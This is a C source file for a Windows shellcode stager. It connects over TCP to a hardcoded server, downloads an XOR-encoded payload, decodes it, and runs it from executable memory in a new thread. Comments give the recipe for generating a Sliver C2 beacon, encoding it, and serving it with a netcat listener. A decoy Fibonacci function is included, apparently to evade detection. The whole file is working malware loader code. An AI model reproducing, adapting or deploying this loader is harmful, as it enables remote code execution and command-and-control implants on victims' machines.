#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define SERVER_ADDRESS "127.0.0.1"
#define SERVER_PORT "1337"
// #define DEFAULT_BUFLEN 1024*1024*20

#include <stdio.h>

/*
	Sliver beacon shellcode $> generate beacon -S 5 -J 0 -m mtls://127.0.0.1:443 --disable-sgn  --format shellcode

	Python XOR operation:
	>>> b = bytearray(open('win_shellcode', 'rb').read())
	>>> for i in range(len(b)):
	>>>     b[i] ^= 0x23
	>>> open('enc_sliver_shellcode', 'wb').write(b'shellcode_littleendian_langth_4_bytes'+b)

	Custom stager listener:
	$> while true; do nc -lvnp 1337 < enc_sliver_shellcode; done
*/


// Just random code (fibbonacci sequence). Ignore
int GetLastFibbonacciNumber(int n) {

	int i;

	// initialize first and second terms
	int t1 = 0, t2 = 1;

	// initialize the next term (3rd term)
	int nextTerm = t1 + t2;

	// 3rd to nth terms
	for (i = 3; i <= n; ++i) {
		t1 = t2;
		t2 = nextTerm;
		nextTerm = t1 + t2;
	}

	return nextTerm;
}

int main() {
	GetLastFibbonacciNumber(40);
	// for socket creation
	WSADATA wsadata;
	WSAStartup(WORD(0x202), &wsadata);

	PCSTR addr = SERVER_ADDRESS;
	PCSTR port = SERVER_PORT;
	addrinfo * result = NULL;
	

	// structure for socket creation and connect
	addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	int resultCode;

	resultCode = getaddrinfo(addr, port, &hints, &result);

	SOCKET ConnectSocket = INVALID_SOCKET;
	ConnectSocket = socket(AF_INET, SOCK_STREAM, 0);
	resultCode = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);

	// getting payload length
	DWORD payloadLength = 0;
	resultCode = recv(ConnectSocket, (CHAR *)&payloadLength, 4, 0);

	printf("Payload length: %d\n", payloadLength);
	
	CHAR* payloadBuf = (CHAR*)calloc(payloadLength, sizeof(CHAR));
	// Так не получилось
	// resultCode = recv(ConnectSocket, payloadBuf, payloadLength, 0);
	// closesocket(ConnectSocket);

	// 1024 bytes read from tcp until all packets cannot be readed
	CHAR tempBuf[1024];
	DWORD lengthIndex = 0;
	do {
		resultCode = recv(ConnectSocket, tempBuf, 1024, 0);
		memcpy(payloadBuf + lengthIndex, tempBuf, resultCode);
		lengthIndex += resultCode;
		//if (lengthIndex >= 201798 - 2000) {
		//	int b = 1;
		//}

	} while (lengthIndex < payloadLength);

	for (int i = 0; i < lengthIndex; i++) {
		payloadBuf[i] = payloadBuf[i] ^ 0x23;
	}
	
	// Popular way to execute downloaded code
	// All AV and EDR will alarm because next 4 lines
	LPVOID execMemPointer = VirtualAlloc(NULL, payloadLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	CopyMemory(execMemPointer, payloadBuf, payloadLength);
	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemPointer, NULL, 0, NULL);
	WaitForSingleObject(tHandle, INFINITE);
}